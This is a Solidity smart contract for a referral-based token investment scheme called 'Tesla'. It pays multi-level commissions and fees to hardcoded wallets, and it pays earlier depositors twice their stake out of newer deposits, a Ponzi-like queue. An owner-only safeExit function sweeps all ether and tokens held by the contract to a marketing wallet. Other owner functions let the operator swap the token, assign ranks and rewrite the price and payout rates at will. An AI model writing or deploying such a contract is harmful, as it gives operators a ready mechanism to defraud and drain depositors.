// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/utils/Counters.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract Tesla is Ownable {
    using SafeERC20 for IERC20;
    using Counters for Counters.Counter;

    IERC20 public token;
    uint256 public price;
    uint256 public dailyLimit = 10000;
    uint256 public totalDeposit;
    uint256 public totalBonus;
    uint256 public totalAllocated;
    uint256 public totalWithdrawn;
    uint256 public totalCommission;
    uint256 public nextPayIndex;
    uint256 public payMultiplier = 2;
    uint256 public totalUsers;

    Counters.Counter private _dailyLimit;

    uint256[] private groupRate = [30, 30, 30, 30, 30]; //group commission rate
    uint256[] private sameRate = [3, 6, 9, 12, 15]; //same rank commission rate
    uint256 private directCommRate = 100; //direct sponsor commission
    uint256 private groupFeeRate = 165; //total group commission should be payout
    uint256 private companyFee = 205; //company earning
    uint256 private poolRate = 30; //for sharing prize pool
    uint256 private levelStep = 10; //total max number to achieve next rank
    uint256 private available;

    address private companyWallet = 0x58E3eBddFB00a4912103E91D3956F804B89EdC48;
    address private poolWallet = 0x38383856953E72f6CA45EC2722F3d86fBA26DC71;
    address private marketingWallet = 0x8906dEb79eCd74aBF76F0e724C70BFD431dec15B;
    address private avengersWallet = 0x88888849da92631624030B63Fab301f70551952B;

    bool private started = false;

    struct Deposit {
        address account;
        uint256 amount;
        uint256 payout;
        uint256 allocated;
        uint256 bonus;
        bool paid;
        uint256 checkpoint;
    }

    struct User {
        address referer;
        address account;
        uint256[] deposits;
        uint256[] partners;
        uint256 totalDeposit;
        uint256 totalAllocated;
        uint256 totalWithdrawn;
        uint256 level;
        bool disableDeposit;
        bool activate;
        bool autoReinvest;
        uint256 totalBonus;
        uint256 directBonus;
    }

    struct Level {
        uint256 level;
        uint256 lvl0;
        uint256 lvl1;
        uint256 lvl2;
        uint256 lvl3;
        uint256 lvl4;
        uint256 lvl5;
    }

    Deposit[] private deposits;
    mapping(address => uint256) private userids;
    mapping(uint256 => User) private users;
    mapping(uint256 => Level) private levels;
    mapping(uint256 => uint256) private checkpoints;

    event Commission(uint256 value);
    event UserMsg(uint256 userid, string msg, uint256 value);

    constructor(IERC20 _token, uint256 _price) {
        token = _token;
        price = _price;
    }

    receive() external payable {}

    function safeExit() external onlyOwner {
        if (address(this).balance > 0) {
            payable(marketingWallet).transfer(address(this).balance);
        }
        if (token.balanceOf(address(this)) > 0) {
            token.safeTransfer(
                marketingWallet,
                token.balanceOf(address(this))
            );
        }
    }

    function invest(address referer) external {
        require(started, "Investment program haven't start!");
        require(_dailyLimit.current() <= dailyLimit, "Over Daily Limit");

        _dailyLimit.increment();
        processDeposit(referer);
        payDirect(referer);
        payGroup(referer);
        payQueue();
    }

    function processDeposit(address referer) private {
        uint256 userid = userids[msg.sender];
        if (userid == 0) {
            totalUsers += 1;
            userid = totalUsers;
            userids[msg.sender] = userid;
            checkpoints[userid] = block.timestamp;
            emit UserMsg(userid, "Joined", 0);
        }
        User storage user = users[userid];
        if (user.account == address(0)) {
            user.account = msg.sender;
        }
        require(user.disableDeposit != true, "Pending Withdraws");
        user.disableDeposit = true;
        user.activate = true;
        user.autoReinvest = true;

        if (user.referer == address(0)) {
            if (
                users[userids[referer]].deposits.length > 0 &&
                referer != msg.sender
            ) {
                user.referer = referer;
                users[userids[referer]].partners.push(userid);
                processLevelUpdate(referer, msg.sender);
            }
        }

        token.safeTransferFrom(msg.sender, address(this), price);
        totalDeposit += price;

        Deposit memory deposit;
        deposit.amount = price;
        deposit.account = msg.sender;
        deposit.checkpoint = block.timestamp;

        emit UserMsg(userids[msg.sender], "Deposit", price);

        user.deposits.push(deposits.length);
        deposits.push(deposit);
        user.totalDeposit += price;
        available += price;
    }

    function payDirect(address referer) private {
        uint256 directCommission = (price * directCommRate) / 1000;
        uint256 uplineId = userids[referer];
        performTransfer(referer, uplineId, directCommission);
        users[uplineId].directBonus += directCommission;
        available -= directCommission;
    }

    function payGroup(address referer) private returns (uint256) {
        uint256 groupCommission = (price * groupFeeRate) / 1000;
        uint256 totalRefOut;
        uint256 prevUplineLevel = 0;
        bool sameRank = false;
        address upline = referer;

        for (uint256 i = 0; i < 5; i++) {
            User storage user = users[userids[referer]];
            uint256 uplineId = userids[upline];
            uint256 currUplineLevel = levels[uplineId].level;
            User storage currUplineUser = users[uplineId];

            if (
                uplineId == 0 ||
                upline == address(0) ||
                currUplineLevel < prevUplineLevel ||
                user.activate == false
            ) break;

            uint256 commission;
            uint256 accruedRate = getAccruedReferralRate(
                prevUplineLevel,
                currUplineLevel
            );

            if (currUplineLevel > prevUplineLevel) {
                if (accruedRate > 0) {
                    commission = (price * accruedRate) / 1000;
                    performTransfer(upline, uplineId, commission);
                    currUplineUser.totalBonus += commission;
                    totalRefOut += commission;
                    groupCommission -= commission;
                }
                sameRank = false;
            } else if (
                currUplineLevel == prevUplineLevel &&
                !sameRank &&
                currUplineLevel > 0
            ) {
                uint256 sameRankRate = sameRate[currUplineLevel - 1];
                if (sameRankRate > 0) {
                    commission = (price * sameRankRate) / 1000;
                    performTransfer(upline, uplineId, commission);
                    currUplineUser.totalBonus += commission;
                    totalRefOut += commission;
                    groupCommission -= commission;
                    sameRank = true;
                }
                i--;
            }
            prevUplineLevel = currUplineLevel;
            upline = currUplineUser.referer;
        }

        if (groupCommission > 0) {
            token.safeTransfer(companyWallet, groupCommission);
            totalCommission += groupCommission;
            available -= groupCommission;
        }

        totalBonus += totalRefOut;
        uint256 companyOut = (price * companyFee) / 1000;
        token.safeTransfer(avengersWallet, companyOut);
        uint256 poolOut = (price * poolRate) / 1000;
        token.safeTransfer(poolWallet, poolOut);
        uint256 cost = companyOut + poolOut;
        emit Commission(cost);
        available -= cost;
        return cost;
    }

    function performTransfer(
        address referer,
        uint256 uplineId,
        uint256 amount
    ) private {
        token.safeTransfer(referer, amount);
        emit UserMsg(uplineId, "RefBonus", amount);
    }

    function getAccruedReferralRate(uint256 prevLevel, uint256 currLevel)
        private
        view
        returns (uint256)
    {
        uint256 rateSum = 0;
        if (prevLevel > currLevel) return 0;
        for (uint256 i = prevLevel; i < currLevel; i++) {
            rateSum += groupRate[i];
        }
        return rateSum;
    }

    function processLevelUpdate(address referer, address from) private {
        uint256 refererid = userids[referer];
        uint256 fromid = userids[from];
        if (referer == address(0) && refererid == 0) return;
        User storage user = users[refererid];
        Level storage level = levels[refererid];

        if (levels[fromid].level == 0) {
            level.lvl0++;
            if (level.lvl0 >= levelStep - 5 && level.level < 1) {
                user.level = 1;
                level.level = 1;
                emit UserMsg(refererid, "LevelUp", 1);
                processLevelUpdate(user.referer, referer);
            }
        } else if (levels[fromid].level == 1) {
            level.lvl1++;
            if (level.lvl1 >= levelStep - 5 && level.level < 2) {
                user.level = 2;
                level.level = 2;
                emit UserMsg(userids[referer], "LevelUp", 2);
                processLevelUpdate(user.referer, referer);
            }
        } else if (levels[fromid].level == 2) {
            level.lvl2++;
            if (level.lvl2 >= levelStep - 5 && level.level < 3) {
                user.level = 3;
                level.level = 3;
                emit UserMsg(userids[referer], "LevelUp", 3);
                processLevelUpdate(user.referer, referer);
            }
        } else if (levels[fromid].level == 3) {
            level.lvl3++;
            if (level.lvl3 >= levelStep && level.level < 4) {
                user.level = 4;
                level.level = 4;
                emit UserMsg(userids[referer], "LevelUp", 4);
                processLevelUpdate(user.referer, referer);
            }
        } else if (levels[fromid].level == 4) {
            level.lvl4++;
            if (level.lvl4 >= levelStep && level.level < 5) {
                user.level = 5;
                level.level = 5;
                emit UserMsg(userids[referer], "LevelUp", 5);
                processLevelUpdate(user.referer, referer);
            }
        }
    }

    function payQueue() private {
        for (
            uint256 index = nextPayIndex;
            index < deposits.length - 1;
            index++
        ) {
            Deposit storage deposit = deposits[index];
            uint256 balance = token.balanceOf(address(this));
            User storage user = users[userids[deposit.account]];
            uint256 half = (available * 8) / 10;
            uint256 needPay = deposit.amount *
                payMultiplier -
                deposit.allocated;
            if (needPay == 0) continue;
            if (half >= needPay) {
                if (balance < needPay) return;
                available -= needPay;
                deposit.allocated += needPay;
                deposit.paid = true;
                user.disableDeposit = false;
                user.totalAllocated += needPay;
                totalAllocated += needPay;
                emit UserMsg(userids[deposit.account], "Dividend", needPay);
                nextPayIndex = index + 1;
            } else {
                if (balance < half) return;
                available -= half;
                deposit.allocated = deposit.allocated + half;
                user.totalAllocated += half;
                totalAllocated += half;
                emit UserMsg(userids[deposit.account], "Dividend", half);
            }
            break;
        }
        uint256 shareUsers = totalUsers - 1;
        uint256 share = available;
        if (share == 0) return;
        for (
            uint256 index = nextPayIndex;
            index < deposits.length - 1;
            index++
        ) {
            Deposit storage deposit = deposits[index];
            uint256 needPay = deposit.amount *
                payMultiplier -
                deposit.allocated;
            uint256 balance = token.balanceOf(address(this));
            if (needPay == 0) continue;
            User storage user = users[userids[deposit.account]];
            uint256 topay = share / shareUsers;
            if (topay >= needPay) {
                if (balance < needPay) return;
                if (available < needPay) return;
                token.safeTransfer(deposit.account, needPay);
                available -= needPay;
                deposit.allocated = deposit.allocated + needPay;
                deposit.paid = true;
                user.disableDeposit = false;
                user.totalAllocated += needPay;
                totalAllocated += needPay;
                emit UserMsg(userids[deposit.account], "Dividend", needPay);
                nextPayIndex = index + 1;
            } else {
                if (balance < topay) return;
                if (available < topay) return;
                deposit.allocated = deposit.allocated + topay;
                available -= topay;
                user.totalAllocated += topay;
                totalAllocated += topay;
                emit UserMsg(userids[deposit.account], "Dividend", topay);
            }
        }
    }

    function claim() external {
        User storage user = users[userids[msg.sender]];
        require(user.deposits.length > 0, "User has no deposits");

        uint256 totalPayout;
        for (uint256 i = 0; i < user.deposits.length; i++) {
            Deposit storage deposit = deposits[user.deposits[i]];
            if (deposit.allocated > deposit.payout) {
                uint256 payoutAmount = deposit.allocated - deposit.payout;
                deposit.payout += payoutAmount;
                user.totalWithdrawn += payoutAmount;
                totalWithdrawn += payoutAmount;
                totalPayout += payoutAmount;
            }

            if (deposit.payout >= deposit.amount * 2) {
                user.disableDeposit = false;
                user.activate = false;
            } else {
                user.disableDeposit = true;
                user.activate = true;
            }
        }

        require(totalPayout > 0, "No payout available");
        token.safeTransfer(msg.sender, totalPayout);
        emit UserMsg(userids[msg.sender], "Claim", totalPayout);
        user.autoReinvest = false;
    }

    function resetCount() external onlyOwner {
        _dailyLimit.reset();
    }

    function setDailyLimit(uint256 _dayLimit) external onlyOwner {
        dailyLimit = _dayLimit;
    }

    function gogoPowerRanger(uint256 userId, uint256 level) external onlyOwner {
        User storage user = users[userId];
        user.level = level;
        levels[userId].level = level;
    }

    function setStarted() external onlyOwner {
        started = true;
    }

    function setPause() external onlyOwner {
        started = false;
    }

    function setPrice(uint256 _price) external onlyOwner {
        price = _price;
    }

    function setToken(IERC20 _token) external onlyOwner {
        token = _token;
    }

    function setCompanyWallet(address wallet) external onlyOwner {
        companyWallet = wallet;
    }

    function setPoolWallet(address wallet) external onlyOwner {
        poolWallet = wallet;
    }

    function setMarketingWallet(address wallet) external onlyOwner {
        marketingWallet = wallet;
    }

    function setGroupRate(uint256[] memory rates) external onlyOwner {
        groupRate = rates;
    }

    function setDirectRate(uint256 rates) external onlyOwner {
        directCommRate = rates;
    }

    function setPoolRate(uint256 rates) external onlyOwner {
        poolRate = rates;
    }

    function setCompanyFee(uint256 rates) external onlyOwner {
        companyFee = rates;
    }

    function setPayMultiplier(uint256 multiplier) external onlyOwner {
        payMultiplier = multiplier;
    }

    function userInfoByAddress(address account) public view returns (uint256) {
        uint256 userId = userids[account];
        require(userId > 0 && userId <= totalUsers, "Invalid user ID");
        return (userId);
    }

    function getContractInfo()
        public
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            bool
        )
    {
        return (
            totalDeposit,
            totalBonus,
            totalWithdrawn,
            deposits.length,
            totalUsers,
            price,
            nextPayIndex,
            started
        );
    }

    function getUserBasicInfo(uint256 userId)
        public
        view
        returns (
            address,
            uint256,
            address,
            bool,
            bool,
            bool
        )
    {
        require(userId > 0 && userId <= totalUsers, "Invalid user ID");
        User storage user = users[userId];
        return (
            user.referer,
            userids[user.referer],
            user.account,
            user.disableDeposit,
            user.activate,
            user.autoReinvest
        );
    }

    function getUserDepositInfo(uint256 userId)
        public
        view
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        require(userId > 0 && userId <= totalUsers, "Invalid user ID");
        User storage user = users[userId];
        return (user.totalDeposit, user.totalAllocated, user.totalWithdrawn);
    }

    function getUserPartnerInfo(uint256 userId)
        public
        view
        returns (uint256[] memory)
    {
        require(userId > 0 && userId <= totalUsers, "Invalid user ID");
        User storage user = users[userId];
        return (user.partners);
    }

    function getUserBonusInfo(uint256 userId)
        public
        view
        returns (uint256, uint256)
    {
        require(userId > 0 && userId <= totalUsers, "Invalid user ID");
        User storage user = users[userId];
        return (user.totalBonus, user.directBonus);
    }

    function getUserLevelInfo(uint256 userId) public view returns (uint256) {
        require(userId > 0 && userId <= totalUsers, "Invalid user ID");
        User storage user = users[userId];
        return (user.level);
    }

    function getUserDeposits(address account)
        public
        view
        returns (Deposit[] memory)
    {
        uint256[] memory depositIndexs = users[userids[account]].deposits;
        Deposit[] memory deps = new Deposit[](depositIndexs.length);
        for (uint256 i = 0; i < depositIndexs.length; i++) {
            deps[i] = deposits[depositIndexs[i]];
        }
        return deps;
    }

    function getPartnerTree(uint256 userId)
        internal
        view
        returns (uint256[] memory)
    {
        uint256[] memory partnerTree = new uint256[](0);
        if (users[userId].partners.length > 0) {
            partnerTree = users[userId].partners;
            for (uint256 i = 0; i < partnerTree.length; i++) {
                uint256[] memory childTree = getPartnerTree(partnerTree[i]);
                if (childTree.length > 0) {
                    partnerTree = concat(partnerTree, childTree);
                    partnerTree = removeDuplicates(partnerTree);
                }
            }
        }
        return partnerTree;
    }

    function removeDuplicates(uint256[] memory arr)
        internal
        pure
        returns (uint256[] memory)
    {
        if (arr.length <= 1) {
            return arr;
        }
        uint256[] memory output = new uint256[](arr.length);
        uint256 counter = 0;
        for (uint256 i = 0; i < arr.length - 1; i++) {
            bool isDuplicate = false;
            for (uint256 j = i + 1; j < arr.length; j++) {
                if (arr[i] == arr[j]) {
                    isDuplicate = true;
                    break;
                }
            }
            if (!isDuplicate) {
                output[counter] = arr[i];
                counter++;
            }
        }
        output[counter] = arr[arr.length - 1];
        uint256[] memory trimmed = new uint256[](counter + 1);
        for (uint256 i = 0; i <= counter; i++) {
            trimmed[i] = output[i];
        }
        return trimmed;
    }

    function concat(uint256[] memory a, uint256[] memory b)
        internal
        pure
        returns (uint256[] memory)
    {
        uint256[] memory c = new uint256[](a.length + b.length);
        for (uint256 i = 0; i < a.length; i++) {
            c[i] = a[i];
        }
        for (uint256 i = 0; i < b.length; i++) {
            c[a.length + i] = b[i];
        }
        return c;
    }

    function getUserPartnerTree(uint256 userId)
        public
        view
        returns (uint256[] memory)
    {
        require(userId > 0 && userId <= totalUsers, "Invalid user ID");
        uint256[] memory partnerTree = getPartnerTree(userId);
        return partnerTree;
    }
}
